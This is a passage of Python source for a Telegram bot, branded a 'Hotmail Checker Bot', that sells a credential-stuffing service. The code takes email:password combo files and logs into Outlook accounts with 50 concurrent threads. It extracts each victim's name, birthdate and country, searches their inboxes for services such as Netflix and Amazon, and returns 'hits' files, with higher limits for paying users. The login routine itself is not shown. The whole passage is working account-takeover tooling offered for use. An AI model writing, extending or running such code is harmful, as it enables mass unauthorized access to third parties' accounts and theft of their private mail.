    total_accounts = len(accounts)
    processed = 0
    successful = 0
    free_accounts = []
    hit_files = defaultdict(list)
    
    # Get user info
    user = await DatabaseManager.get_user(user_id)
    username = user.get("username", "")
    full_name = user.get("full_name", "")
    is_premium = await DatabaseManager.is_premium(user_id)
    
    # Create results directory
    results_dir = f"results_{user_id}_{int(time.time())}"
    os.makedirs(results_dir, exist_ok=True)
    
    animation_index = 0
    last_update = time.time()
    
    try:
        # Send starting message
        status_msg = await message.reply_text(
            f"🚀 **Starting Batch Processing**\n"
            f"⏳ **Initializing 50 threads...**\n\n"
            f"📊 **Accounts:** {total_accounts}\n"
            f"🎯 **Targets:** {', '.join(targets)}\n\n"
            f"{format_checked_by(user_id, username, full_name, is_premium)}\n"
            f"👑 **Configured by:** {OWNER_USERNAME}",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=create_back_keyboard()
        )
        
        await asyncio.sleep(1)
        
        # Reset hit counts for this session
        user_hit_counts[user_id] = defaultdict(int)
        
        # Process accounts with controlled concurrency
        semaphore = asyncio.Semaphore(50)
        
        async def process_with_semaphore(email: str, password: str):
            async with semaphore:
                try:
                    # Check if task should continue
                    if user_id not in active_tasks or not active_tasks[user_id].get("running", True):
                        return None
                    
                    # Process with timeout
                    return await asyncio.wait_for(
                        process_single_account(email, password, targets),
                        timeout=30
                    )
                except asyncio.TimeoutError:
                    return {"status": "TIMEOUT", "email": email, "password": password}
                except Exception as e:
                    return {"status": "ERROR", "email": email, "password": password, "error": str(e)}
        
        # Process accounts in batches of 100
        for i in range(0, total_accounts, 100):
            # Check if task should continue
            if user_id not in active_tasks or not active_tasks[user_id].get("running", True):
                break
            
            batch = accounts[i:min(i + 100, total_accounts)]
            tasks = []
            
            for email, password in batch:
                tasks.append(process_with_semaphore(email, password))
            
            # Process batch
            try:
                batch_results = await asyncio.wait_for(
                    asyncio.gather(*tasks, return_exceptions=True),
                    timeout=300
                )
                
                # Process results
                for j, result in enumerate(batch_results):
                    if isinstance(result, Exception):
                        continue
                    
                    if not result:
                        continue
                    
                    processed += 1
                    
                    if result.get("status") == "SUCCESS":
                        successful += 1
                        
                        # Process hits
                        email, password = batch[j]
                        target_found = False
                        
                        for target in targets:
                            if target in result.get("searches", {}):
                                search_result = result["searches"][target]
                                if search_result.get("has_results"):
                                    target_found = True
                                    
                                    # Update hit count
                                    user_hit_counts[user_id][target] += 1
                                    hit_count = user_hit_counts[user_id][target]
                                    
                                    # Format hit message
                                    profile = result.get("profile", {})
                                    message_text, line = format_hit_message(
                                        email, password, profile, target, 
                                        search_result, user_id, username, 
                                        full_name, is_premium
                                    )
                                    
                                    hit_files[target].append(line)
                                    
                                    # Send hit notification
                                    try:
                                        copy_id = str(uuid.uuid4())
                                        copy_cache[copy_id] = line
                                        
                                        await app.send_message(
                                            user_id,
                                            message_text,
                                            parse_mode=ParseMode.MARKDOWN,
                                            reply_markup=InlineKeyboardMarkup([
                                                [InlineKeyboardButton("📋 Copy", callback_data=f"copy_{copy_id}")]
                                            ])
                                        )
                                    except:
                                        pass
                                    break
                        
                        if not target_found:
                            free_accounts.append(f"{email}:{password}")
                    
                    # Update status periodically
                    current_time = time.time()
                    if processed % 50 == 0 or current_time - last_update > 5:
                        last_update = current_time
                        animation_index = (animation_index + 1) % len(ANIMATION_FRAMES)
                        percentage = (processed / total_accounts) * 100
                        
                        try:
                            total_hits = sum(len(v) for v in hit_files.values())
                            
                            # Create target breakdown with counts
                            target_breakdown = ""
                            for target in targets:
                                count = user_hit_counts[user_id].get(target, 0)
                                target_breakdown += f"• **{target}** → `{count} hits`\n"
                            
                            status_text = (
                                f"⚡ **Batch Processing**\n"
                                f"{ANIMATION_FRAMES[animation_index]} **Working...**\n\n"
                                f"📊 **Progress:** {percentage:.1f}%\n"
                                f"• **Processed:** {processed}/{total_accounts}\n"
                                f"• **Successful:** {successful}\n"
                                f"• **Total Hits:** {total_hits}\n"
                                f"• **Free:** {len(free_accounts)}\n\n"
                                f"🎯 **Target Breakdown:**\n"
                                f"{target_breakdown}\n"
                                f"⚡ **Threads:** 50\n\n"
                                f"{format_checked_by(user_id, username, full_name, is_premium)}\n"
                                f"👑 **Configured by:** {OWNER_USERNAME}"
                            )
                            
                            await status_msg.edit_text(
                                status_text,
                                parse_mode=ParseMode.MARKDOWN,
                                reply_markup=create_back_keyboard()
                            )
                        except:
                            pass
                
            except asyncio.TimeoutError:
                logger.warning(f"Batch {i}-{i+100} timed out")
                processed += len(batch)
                continue
            
            # Small delay between batches
            await asyncio.sleep(0.5)
        
        # Update user statistics
        total_hits = sum(len(v) for v in hit_files.values())
        await DatabaseManager.update_user_stats(user_id, "batch", total_hits)
        
        # Save and send results
        await save_and_send_results(user_id, results_dir, hit_files, free_accounts, targets, username, full_name, is_premium)
        
        # Send final summary
        await send_typing_animation(user_id, 2)
        
        # Create final summary
        summary = (
            f"🎉 **BATCH PROCESSING COMPLETE!**\n\n"
            f"📈 **FINAL STATISTICS**\n"
            f"┌─────────────────────────────┐\n"
            f"│ • **Total Accounts**: {total_accounts}\n"
            f"│ • **Successfully Checked**: {successful}\n"
            f"│ • **Failed**: {total_accounts - successful}\n"
            f"│ • **Total Hits Found**: {total_hits}\n"
            f"│ • **Free Accounts**: {len(free_accounts)}\n"
            f"│ • **Threads Used**: 50 ⚡\n"
            f"└─────────────────────────────┘\n\n"
        )
        
        if hit_files:
            summary += "🎯 **TARGET BREAKDOWN**\n"
            for target, hits in hit_files.items():
                summary += f"• **{target}** → `{len(hits)} hits`\n"
        
        summary += f"\n{format_checked_by(user_id, username, full_name, is_premium)}\n"
        summary += f"👑 **Configured by:** {OWNER_USERNAME}\n\n"
        summary += format_credits()
        
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔄 New Check", callback_data="new_check")],
            [InlineKeyboardButton("👑 Contact Owner", url=f"tg://user?id={OWNER_ID}")]
        ])
        
        await status_msg.edit_text(summary, parse_mode=ParseMode.MARKDOWN, reply_markup=keyboard)
        
    except Exception as e:
        logger.error(f"Batch worker error: {e}")
        await message.reply_text(
            f"❌ **Error in batch processing**\n"
            f"Error: `{str(e)[:200]}`\n\n"
            f"Please try again with smaller batch size.\n\n"
            f"{format_checked_by(user_id, username, full_name, is_premium)}\n"
            f"👑 **Configured by:** {OWNER_USERNAME}",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=create_back_keyboard()
        )
    finally:
        # Clean up directory
        try:
            if os.path.exists(results_dir):
                shutil.rmtree(results_dir)
        except:
            pass
        
        # Clear hit counts for this user
        if user_id in user_hit_counts:
            del user_hit_counts[user_id]
        
        remove_task(user_id)

async def save_and_send_results(user_id: int, results_dir: str, hit_files: Dict, free_accounts: List, targets: List[str], username: str, full_name: str, is_premium: bool):
    """Save and send results to user"""
    try:
        # Save results to files
        for target, hits in hit_files.items():
            if hits:
                filename = f"{results_dir}/hits_{target}.txt"
                async with aiofiles.open(filename, "w", encoding="utf-8") as f:
                    # Add header to file
                    await f.write(f"Hits for {target.upper()} - Found: {len(hits)} accounts\n")
                    await f.write(f"Checked By: {full_name if full_name else username}\n")
                    await f.write(f"User Type: {'Premium' if is_premium else 'Free'}\n")
                    await f.write(f"Bot By: {OWNER_USERNAME}\n")
                    await f.write("="*50 + "\n\n")
                    
                    for line in hits:
                        await f.write(line + "\n\n")
                
                # Send hits file
                try:
                    await send_typing_animation(user_id, 1)
                    await app.send_document(
                        user_id,
                        filename,
                        caption=(
                            f"✅ **Hits for: {target.upper()}**\n"
                            f"📊 **Found:** {len(hits)} accounts\n"
                            f"⚡ **Threads:** 50\n\n"
                            f"{format_checked_by(user_id, username, full_name, is_premium)}\n"
                            f"👑 **By:** {OWNER_USERNAME}"
                        ),
                        reply_markup=create_back_keyboard()
                    )
                except Exception as e:
                    logger.error(f"Error sending hits file for {target}: {e}")
        
        # Save free accounts
        if free_accounts:
            free_filename = f"{results_dir}/free.txt"
            async with aiofiles.open(free_filename, "w", encoding="utf-8") as f:
                # Add header to file
                await f.write(f"Free Accounts - Count: {len(free_accounts)}\n")
                await f.write(f"Checked By: {full_name if full_name else username}\n")
                await f.write(f"User Type: {'Premium' if is_premium else 'Free'}\n")
                await f.write(f"Bot By: {OWNER_USERNAME}\n")
                await f.write("="*50 + "\n\n")
                
                for line in free_accounts:
                    await f.write(line + "\n")
            
            # Send free accounts file
            try:
                await send_typing_animation(user_id, 1)
                await app.send_document(
                    user_id,
                    free_filename,
                    caption=(
                        f"✅ **Free Accounts**\n"
                        f"📊 **Count:** {len(free_accounts)}\n"
                        f"⚡ **Threads:** 50\n\n"
                        f"{format_checked_by(user_id, username, full_name, is_premium)}\n"
                        f"👑 **By:** {OWNER_USERNAME}"
                    ),
                    reply_markup=create_back_keyboard()
                )
            except Exception as e:
                logger.error(f"Error sending free accounts file: {e}")
        
        # Clean up
        try:
            for file in os.listdir(results_dir):
                file_path = os.path.join(results_dir, file)
                try:
                    if os.path.isfile(file_path):
                        os.unlink(file_path)
                    elif os.path.isdir(file_path):
                        shutil.rmtree(file_path)
                except Exception as e:
                    logger.error(f"Error deleting file {file_path}: {e}")
            
            os.rmdir(results_dir)
        except Exception as e:
            logger.error(f"Error cleaning up directory {results_dir}: {e}")
        
    except Exception as e:
        logger.error(f"Error saving/sending results: {e}")

# Bot commands and handlers
@app.on_callback_query()
async def callback_handler(client, callback_query):
    """Handle callback queries"""
    user_id = callback_query.from_user.id
    data = callback_query.data
    
    # Update user info
    try:
        user = await DatabaseManager.get_user(user_id)
        if user:
            await DatabaseManager.update_user_info(
                user_id, 
                callback_query.from_user.username or "",
                f"{callback_query.from_user.first_name or ''} {callback_query.from_user.last_name or ''}".strip()
            )
    except:
        pass
    
    try:
        if data == "back_to_menu":
            await callback_query.answer()
            await send_main_menu(callback_query.message)
        
        elif data == "single_check":
            await callback_query.answer()
            user = await DatabaseManager.get_user(user_id)
            username = user.get("username", "")
            full_name = user.get("full_name", "")
            is_premium = await DatabaseManager.is_premium(user_id)
            
            await callback_query.message.edit_text(
                f"🔍 **Single Account Check**\n\n"
                f"**Usage:**\n"
                f"`/check email:password target1 target2`\n\n"
                f"**Example:**\n"
                f"`/check test@hotmail.com:password123 netflix amazon`\n\n"
                f"**Note:** Separate multiple targets with space\n\n"
                f"✅ **FREE FOR ALL USERS**\n\n"
                f"{format_checked_by(user_id, username, full_name, is_premium)}\n"
                f"👑 **Configured by:** {OWNER_USERNAME}",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=create_back_keyboard()
            )
        
        elif data == "batch_check":
            await callback_query.answer()
            user = await DatabaseManager.get_user(user_id)
            username = user.get("username", "")
            full_name = user.get("full_name", "")
            is_premium = await DatabaseManager.is_premium(user_id)
            
            await callback_query.message.edit_text(
                f"📁 **Batch Account Check**\n\n"
                f"**How to use:**\n"
                f"1. Send me a `.txt` file with email:password combos\n"
                f"2. Reply to that file with `/batch target1 target2`\n\n"
                f"**File Format:**\n"
                f"```\nemail1:password1\nemail2:password2\nemail3:password3\n```\n\n"
                f"**Features:**\n"
                f"• 50 concurrent threads ⚡\n"
                f"• Real-time hit notifications\n"
                f"• Progress tracking with hit counts\n"
                f"• Sends hit_{{target}}.txt and free.txt files\n\n"
                f"🎫 **Subscription Required!**\n"
                f"Free users: 5 batches/day\n"
                f"Premium users: Higher limits\n\n"
                f"{format_checked_by(user_id, username, full_name, is_premium)}\n"
                f"👑 **Configured by:** {OWNER_USERNAME}",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=create_back_keyboard()
            )
        
        elif data == "my_plan":
            await callback_query.answer()
            user = await DatabaseManager.get_user(user_id)
            
            if user:
                subscription = user.get("subscription", {})
                stats = user.get("stats", {})
                username = user.get("username", "")
                full_name = user.get("full_name", "")
                is_premium = await DatabaseManager.is_premium(user_id)
                
                expiry_date = subscription.get("expiry_date")
                if expiry_date and datetime.utcnow() > expiry_date:
                    await DatabaseManager.remove_subscription(user_id)
                    subscription = {
                        "plan_name": "Free",
                        "batch_limit": FREE_DAILY_BATCH_LIMIT,
                        "used_batch_today": 0
                    }
                    is_premium = False
                
                plan_text = f"🎫 **Your Subscription Plan**\n\n"
                plan_text += f"┌─────────────────────────┐\n"
                plan_text += f"│ **Plan**: {subscription.get('plan_name', 'Free')}\n"
                
                if subscription.get('plan_id'):
                    if expiry_date:
                        remaining = expiry_date - datetime.utcnow()
                        days = remaining.days
                        hours = int(remaining.seconds // 3600)
                        plan_text += f"│ **Expires**: {days}d {hours}h\n"
                else:
                    plan_text += f"│ **Type**: Free User\n"
                
                plan_text += f"│ **Daily Limit**: {subscription.get('batch_limit', FREE_DAILY_BATCH_LIMIT)}\n"
                plan_text += f"│ **Used Today**: {subscription.get('used_batch_today', 0)}\n"
                plan_text += f"│ **Remaining**: {subscription.get('batch_limit', FREE_DAILY_BATCH_LIMIT) - subscription.get('used_batch_today', 0)}\n"
                plan_text += f"└─────────────────────────┘\n\n"
                
                plan_text += f"📊 **Your Statistics**\n"
                plan_text += f"┌─────────────────────────┐\n"
                plan_text += f"│ **Total Checks**: {stats.get('total_checks', 0)}\n"
                plan_text += f"│ **Total Batches**: {stats.get('total_batches', 0)}\n"
                plan_text += f"│ **Total Hits**: {stats.get('total_hits', 0)}\n"
                plan_text += f"│ **Last Active**: {stats.get('last_active', 'Never').strftime('%Y-%m-%d %H:%M') if isinstance(stats.get('last_active'), datetime) else 'Never'}\n"
                plan_text += f"└─────────────────────────┘\n\n"
                
                plan_text += f"{format_checked_by(user_id, username, full_name, is_premium)}\n"
                
                if not subscription.get('plan_id'):
                    plan_text += f"\n💎 **Upgrade for more features!**\n"
                    plan_text += f"Use /plans to see available plans\n"
                
                plan_text += f"👑 **Configured by:** {OWNER_USERNAME}"
                
                keyboard = InlineKeyboardMarkup([
                    [InlineKeyboardButton("💎 View Plans", callback_data="plans")],
                    [InlineKeyboardButton("🔙 Menu", callback_data="back_to_menu")]
                ])
                
                await callback_query.message.edit_text(
                    plan_text,
                    parse_mode=ParseMode.MARKDOWN,
                    reply_markup=keyboard
                )
        
        elif data == "plans":
            await callback_query.answer()
            user = await DatabaseManager.get_user(user_id)
            username = user.get("username", "")
            full_name = user.get("full_name", "")
            is_premium = await DatabaseManager.is_premium(user_id)
            
            plans = await DatabaseManager.get_all_plans()
            
            if not plans:
                plans_text = "📭 **No Plans Available**\n\nContact admin to set up plans."
            else:
                plans_text = "💎 **Available Subscription Plans**\n\n"
                
                for i, plan in enumerate(plans, 1):
                    plans_text += f"**{i}. {plan['name']}**\n"
                    plans_text += f"   ├ **Duration**: {plan['days']} days\n"
                    plans_text += f"   ├ **Price**: {plan['price']}\n"
                    plans_text += f"   ├ **Daily Limit**: {plan['batch_limit']} batches\n"
                    plans_text += f"   └ **Features**:\n"
                    
                    for feature in plan.get('features', []):
                        plans_text += f"      • {feature}\n"
                    
                    plans_text += "\n"
            
            plans_text += "\n📞 **Contact owner for purchase:**\n"
            plans_text += f"{OWNER_USERNAME}\n\n"
            plans_text += "💡 **Free Plan**: 5 batches/day\n\n"
            plans_text += f"{format_checked_by(user_id, username, full_name, is_premium)}\n"
            plans_text += f"👑 **Configured by:** {OWNER_USERNAME}"
            
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("🎫 My Plan", callback_data="my_plan")],
                [InlineKeyboardButton("🔙 Menu", callback_data="back_to_menu")]
            ])
            
            await callback_query.message.edit_text(
                plans_text,
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=keyboard
            )
        
        elif data == "stop_task":
            await callback_query.answer()
            user = await DatabaseManager.get_user(user_id)
            username = user.get("username", "")
            full_name = user.get("full_name", "")
            is_premium = await DatabaseManager.is_premium(user_id)
            
            if stop_user_task(user_id):
                await callback_query.message.edit_text(
                    f"🛑 **Task Stopped Successfully**\n\n"
                    f"Your current task has been terminated.\n\n"
                    f"{format_checked_by(user_id, username, full_name, is_premium)}\n"
                    f"👑 **Configured by:** {OWNER_USERNAME}",
                    parse_mode=ParseMode.MARKDOWN,
                    reply_markup=create_back_keyboard()
                )
            else:
                await callback_query.message.edit_text(
                    f"ℹ️ **No Active Task**\n\n"
                    f"You don't have any running task to stop.\n\n"
                    f"{format_checked_by(user_id, username, full_name, is_premium)}\n"
                    f"👑 **Configured by:** {OWNER_USERNAME}",
                    parse_mode=ParseMode.MARKDOWN,
                    reply_markup=create_back_keyboard()
                )
        
        elif data == "status":
            await callback_query.answer()
            user = await DatabaseManager.get_user(user_id)
            username = user.get("username", "")
            full_name = user.get("full_name", "")
            is_premium = await DatabaseManager.is_premium(user_id)
            
            if user_id in active_tasks:
                task = active_tasks[user_id]
                elapsed = time.time() - task["start_time"]
                
                status_text = (
                    f"📊 **Task Status**\n\n"
                    f"┌─────────────────────┐\n"
                    f"│ • **Type**: {task['type'].upper()}\n"
                    f"│ • **Status**: {'✅ Running' if task.get('running', True) else '🛑 Stopped'}\n"
                    f"│ • **Duration**: {elapsed:.1f}s\n"
                )
                
                if task["type"] == "batch":
                    status_text += f"│ • **Accounts**: {task['data'].get('total_accounts', 'N/A')}\n"
                    status_text += f"│ • **Targets**: {', '.join(task['data'].get('targets', []))}\n"
                    status_text += f"│ • **Threads**: 50 ⚡\n"
                
                status_text += f"└─────────────────────┘\n\n"
                status_text += f"{get_animation_frame()} **Working...**\n\n"
                status_text += f"{format_checked_by(user_id, username, full_name, is_premium)}\n"
                status_text += f"👑 **Configured by:** {OWNER_USERNAME}"
                
            else:
                status_text = (
                    f"📊 **Task Status**\n\n"
                    f"ℹ️ No active task found.\n"
                    f"You can start a new task from the main menu.\n\n"
                    f"{format_checked_by(user_id, username, full_name, is_premium)}\n"
                    f"👑 **Configured by:** {OWNER_USERNAME}"
                )
            
            await callback_query.message.edit_text(
                status_text,
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=create_back_keyboard()
            )
        
        elif data == "help":
            await callback_query.answer()
            user = await DatabaseManager.get_user(user_id)
            username = user.get("username", "")
            full_name = user.get("full_name", "")
            is_premium = await DatabaseManager.is_premium(user_id)
            
            await callback_query.message.edit_text(
                f"📖 **Help & Instructions**\n\n"
                f"**Available Commands:**\n"
                f"• `/check` - Check single account (FREE)\n"
                f"• `/batch` - Batch check (Subscription)\n"
                f"• `/plans` - View subscription plans\n"
                f"• `/myplan` - Check your subscription\n"
                f"• `/stop` - Stop current task\n"
                f"• `/status` - Check task status\n\n"
                f"**Features:**\n"
                f"• Real-time hit notifications 🎯\n"
                f"• Profile information extraction 📋\n"
                f"• Inbox search for targets 🔍\n"
                f"• Batch processing with 50 threads ⚡\n"
                f"• Free: 5 batches/day\n"
                f"• Premium: Higher limits 💎\n"
                f"• Real-time hit counting 📊\n\n"
                f"**Need Help?**\n"
                f"Contact: {OWNER_USERNAME}\n\n"
                f"{format_checked_by(user_id, username, full_name, is_premium)}\n"
                f"👑 **Configured by:** {OWNER_USERNAME}\n\n"
                f"{format_credits()}",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=create_back_keyboard()
            )
        
        elif data == "new_check":
            await callback_query.answer()
            await send_main_menu(callback_query.message)
        
        elif data.startswith("copy_"):
            copy_id = data.split("_")[1]
            if copy_id in copy_cache:
                text_to_copy = copy_cache[copy_id]
                await callback_query.answer("✅ Copied to clipboard!\n📋 Click and hold to select text", show_alert=True)
                
                user = await DatabaseManager.get_user(user_id)
                username = user.get("username", "")
                full_name = user.get("full_name", "")
                is_premium = await DatabaseManager.is_premium(user_id)
                
                await callback_query.message.reply_text(
                    f"📋 **Copy this text:**\n\n"
                    f"```\n{text_to_copy}\n```\n\n"
                    f"_Click above to select, then copy_\n\n"
                    f"{format_checked_by(user_id, username, full_name, is_premium)}\n"
                    f"👑 **Configured by:** {OWNER_USERNAME}",
                    parse_mode=ParseMode.MARKDOWN
                )
            else:
                await callback_query.answer("❌ Copy failed. Text not found.", show_alert=True)
    
    except Exception as e:
        logger.error(f"Callback error: {e}")
        await callback_query.answer("❌ Error occurred", show_alert=True)

async def send_main_menu(message: Message):
    """Send main menu"""
    welcome_text = (
        f"👋 **Welcome to Hotmail Checker Bot!**\n\n"
        f"**Powerful Outlook Account Checker**\n"
        f"• Login & Profile Extraction\n"
        f"• Inbox Search for Targets\n"
        f"• Batch Processing (50 threads) ⚡\n"
        f"• Real-time Hit Notifications\n"
        f"• Automatic File Cleanup\n"
        f"• Real-time Hit Counting 📊\n\n"
        f"{format_credits()}"
    )
    
    await message.edit_text(
        welcome_text,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=create_main_keyboard()
    )

@app.on_message(filters.command("start"))
async def start_command(client, message: Message):
    """Start command handler"""
    user_id = message.from_user.id
    
    await send_typing_animation(message.chat.id, 1)
    
    # Get or create user and update info
    await DatabaseManager.get_user(user_id)
    await DatabaseManager.update_user_info(
        user_id, 
        message.from_user.username or "",
        f"{message.from_user.first_name or ''} {message.from_user.last_name or ''}".strip()
    )
    
    user = await DatabaseManager.get_user(user_id)
    username = user.get("username", "")
    full_name = user.get("full_name", "")
    is_premium = await DatabaseManager.is_premium(user_id)
    
    welcome_text = (
        f"🌟 **Hotmail Checker Bot**\n\n"
        f"Welcome to the most advanced Outlook account checker!\n"
        f"⚡ **Now with 50 threads for faster checking!**\n\n"
        f"**Free Users:** 5 batch checks/day\n"
        f"**Premium Users:** Higher limits & priority\n"
        f"**Real-time Hit Counting** 📊\n\n"
        f"{format_checked_by(user_id, username, full_name, is_premium)}\n"
        f"👑 **Configured by:** {OWNER_USERNAME}\n\n"
        f"{format_credits()}\n\n"
        f"**Select an option below to get started:**"
    )
    
    await message.reply_text(
        welcome_text,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=create_main_keyboard(user_id)
    )

@app.on_message(filters.command("check"))
async def check_command(client, message: Message):
    """Single account check command"""
    user_id = message.from_user.id
    
    # Update user info
    await DatabaseManager.update_user_info(
        user_id, 
        message.from_user.username or "",
        f"{message.from_user.first_name or ''} {message.from_user.last_name or ''}".strip()
    )
    
    user = await DatabaseManager.get_user(user_id)
    username = user.get("username", "")
    full_name = user.get("full_name", "")
    is_premium = await DatabaseManager.is_premium(user_id)
    
    await send_thinking_animation(message.chat.id)
    
    if is_user_busy(user_id):
        await message.reply_text(
            f"⚠️ **Task Already Running**\n\n"
            f"You already have an active task.\n"
            f"Use `/stop` to cancel it first or check status.\n\n"
            f"{format_checked_by(user_id, username, full_name, is_premium)}\n"
            f"👑 **Configured by:** {OWNER_USERNAME}",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=create_back_keyboard()
        )
        return
    
    args = message.text.split()[1:]
    if len(args) < 2:
        await message.reply_text(
            f"❌ **Invalid Format**\n\n"
            f"**Usage:**\n"
            f"`/check email:password target1 target2`\n\n"
            f"**Example:**\n"
            f"`/check test@hotmail.com:password123 netflix amazon`\n\n"
            f"**Note:** Separate multiple targets with space\n\n"
            f"✅ **FREE FOR ALL USERS**\n\n"
            f"{format_checked_by(user_id, username, full_name, is_premium)}\n"
            f"👑 **Configured by:** {OWNER_USERNAME}",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=create_back_keyboard()
        )
        return
    
    creds = args[0]
    if ":" not in creds:
        await message.reply_text(
            f"❌ **Invalid Credential Format**\n\n"
            f"Please use `email:password` format.\n\n"
            f"{format_checked_by(user_id, username, full_name, is_premium)}\n"
            f"👑 **Configured by:** {OWNER_USERNAME}",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=create_back_keyboard()
        )
        return
    
    email, password = creds.split(":", 1)
    targets = args[1:]
    
    add_task(user_id, "single", {"email": email, "password": password, "targets": targets})
    
    asyncio.create_task(process_single_check(user_id, email, password, targets, message, username, full_name, is_premium))

async def process_single_check(user_id: int, email: str, password: str, targets: List[str], message: Message, username: str, full_name: str, is_premium: bool):
    """Process single check and send results"""
    try:
        status_msg = await message.reply_text(
            f"🔍 **Starting Account Check**\n"
            f"{get_animation_frame()} **Processing...**\n\n"
            f"• **Email**: `{email}`\n"
            f"• **Targets**: {', '.join(targets)}\n\n"
            f"⏳ Please wait while I check the account...\n\n"
            f"{format_checked_by(user_id, username, full_name, is_premium)}\n"
            f"👑 **Configured by:** {OWNER_USERNAME}",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=create_back_keyboard()
        )
        
        animation_task = asyncio.create_task(update_check_animation(status_msg, user_id, username, full_name, is_premium))
        
        async with OutlookProfileChecker(user_id, debug=True) as checker:
            result = await checker.check_account(email, password, targets)
        
        animation_task.cancel()
        
        hits_found = 0
        for target in targets:
            if target in result.get("searches", {}):
                search_result = result["searches"][target]
                if search_result.get("has_results"):
                    hits_found += 1
        
        await DatabaseManager.update_user_stats(user_id, "single", hits_found)
        
        if result["status"] == "SUCCESS":
            await send_typing_animation(message.chat.id, 1)
            
            response_text = f"✅ **LOGIN SUCCESSFUL**\n\n"
            response_text += f"• **Account**: `{email}:{password}`\n\n"
            
            if result["profile"]:
                profile = result["profile"]
                response_text += f"📋 **PROFILE INFORMATION**\n"
                if profile['name']:
                    response_text += f"• **Name**: `{profile['name']}`\n"
                if profile['country']:
                    response_text += f"• **Country**: `{profile['country']}`\n"
                if profile['birthdate']:
                    response_text += f"• **Birthdate**: `{profile['birthdate']}`\n"
                response_text += f"\n"
            
            response_text += f"🔍 **SEARCH RESULTS**\n\n"
            
            hits_found = False
            hit_count = 0
            for target in targets:
                if target in result.get("searches", {}):
                    search_result = result["searches"][target]
                    
                    if search_result["status"] == "SUCCESS":
                        if search_result.get("has_results") and search_result.get("results"):
                            hits_found = True
                            hit_count += 1
                            results = search_result["results"]
                            response_text += f"🎯 **{target.upper()}:** ✅ FOUND ({results['total']} messages)\n"
                            response_text += f"   ├ Last Message: `{results['last_message_date']}`\n"
                            
                            if results['senders']:
                                response_text += f"   ├ Senders: `{', '.join(results['senders'][:3])}`\n"
                            
                            if results['preview']:
                                preview = results['preview']
                                if len(preview) > 80:
                                    preview = preview[:77] + "..."
                                response_text += f"   └ Preview: `{preview}`\n"
                        else:
                            response_text += f"❌ **{target.upper()}:** No results\n"
                    else:
                        response_text += f"⚠️ **{target.upper()}:** Error\n"
                else:
                    response_text += f"⚠️ **{target.upper()}:** Not searched\n"
            
            summary_line = f"{email}:{password}"
            if result["profile"]:
                profile = result["profile"]
                if profile['name']:
                    summary_line += f" | Name = {profile['name']}"
                if profile['birthdate']:
                    summary_line += f" | birthDate = {profile['birthdate']}"
                if profile['country']:
                    summary_line += f" | Country = {profile['country']}"
            
            if hits_found:
                for target in targets:
                    if target in result.get("searches", {}):
                        search_result = result["searches"][target]
                        if search_result.get("has_results"):
                            results = search_result.get("results", {})
                            summary_line += f" | Target = {target}"
                            summary_line += f" | Total = {results.get('total', 0)}"
                            summary_line += f" | hasMsgFromTarget = ✔️"
                            
                            if results.get('preview'):
                                preview = results['preview']
                                preview = re.sub(r'[\u2000-\u200F\u2028-\u202F\u205F-\u206F\uFEFF\u00AD]', '', preview)
                                preview = re.sub(r'\s+', ' ', preview).strip()
                                if len(preview) > 80:
                                    preview = preview[:77] + "..."
                                summary_line += f" | Preview = {preview}"
                            
                            if results.get('last_message_date'):
                                summary_line += f" | lastMsg = {results['last_message_date']}"
                            
                            summary_line += f" | BotBy = @still_alivenow"
                            break
            
            response_text += f"\n📝 **SUMMARY**\n```\n{summary_line}\n```\n\n"
            response_text += f"🎯 **Total Hits Found:** {hit_count}\n\n"
            response_text += f"{format_checked_by(user_id, username, full_name, is_premium)}\n"
            response_text += f"👑 **Configured by:** {OWNER_USERNAME}"
            
            keyboard = create_copy_keyboard(summary_line)
            
        else:
            response_text = f"❌ **LOGIN FAILED**\n\n"
            response_text += f"• **Account**: `{email}:{password}`\n"
            response_text += f"• **Error**: `{result.get('error', 'Unknown error')}`\n"
            response_text += f"• **Status**: `{result['status']}`\n\n"
            response_text += f"💡 **Tips:**\n"
            response_text += f"• Check email/password\n"
            response_text += f"• Account might be locked\n"
            response_text += f"• Try different account\n\n"
            response_text += f"{format_checked_by(user_id, username, full_name, is_premium)}\n"
            response_text += f"👑 **Configured by:** {OWNER_USERNAME}"
            
            keyboard = create_back_keyboard()
        
        await status_msg.edit_text(response_text, parse_mode=ParseMode.MARKDOWN, reply_markup=keyboard)
        
    except Exception as e:
        logger.error(f"Single check error: {e}")
        await message.reply_text(
            f"❌ **Error Occurred**\n\n"
            f"Error: `{str(e)}`\n\n"
            f"Please try again or contact {OWNER_USERNAME}\n\n"
            f"{format_checked_by(user_id, username, full_name, is_premium)}\n"
            f"👑 **Configured by:** {OWNER_USERNAME}",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=create_back_keyboard()
        )
    finally:
        remove_task(user_id)

async def update_check_animation(message: Message, user_id: int, username: str, full_name: str, is_premium: bool):
    """Update animation during single check"""
    animation_index = 0
    while True:
        try:
            animation_index = (animation_index + 1) % len(ANIMATION_FRAMES)
            await message.edit_text(
                f"🔍 **Checking Account**\n"
                f"**{ANIMATION_FRAMES[animation_index]}** **Processing...**\n\n"
                f"⏳ This may take a moment...\n\n"
                f"{format_checked_by(user_id, username, full_name, is_premium)}\n"
                f"👑 **Configured by:** {OWNER_USERNAME}",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=create_back_keyboard()
            )
            await asyncio.sleep(1)
        except:
            break

@app.on_message(filters.command("batch"))
async def batch_command(client, message: Message):
    """Batch check command"""
    user_id = message.from_user.id
    
    # Update user info
    await DatabaseManager.update_user_info(
        user_id, 
        message.from_user.username or "",
        f"{message.from_user.first_name or ''} {message.from_user.last_name or ''}".strip()
    )
    
    user = await DatabaseManager.get_user(user_id)
    username = user.get("username", "")
    full_name = user.get("full_name", "")
    is_premium = await DatabaseManager.is_premium(user_id)
    
    await send_thinking_animation(message.chat.id)
    
    if is_user_busy(user_id):
        await message.reply_text(
